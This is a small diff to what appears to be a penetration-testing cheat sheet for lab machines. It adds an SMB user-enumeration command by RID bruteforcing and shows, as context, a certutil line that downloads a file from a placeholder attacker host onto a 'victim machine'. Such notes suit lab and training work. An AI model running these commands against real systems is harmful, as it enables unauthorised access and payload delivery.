@@ -24,6 +24,9 @@ Test for guest logon (SMB port 445)
 File transfer using certutil (Ran from victim machine)
 - `certutil -urlcache -f http://<attacker_ip>/example.txt example.txt`
 
+Enumerate users via `RID` bruteforcing.
+- `nxc smb 10.129.12.136 -u '<username>' -p '<password>' --rid-brute`
+
 ## Linux:
 
 Find all `SUID` binaries.
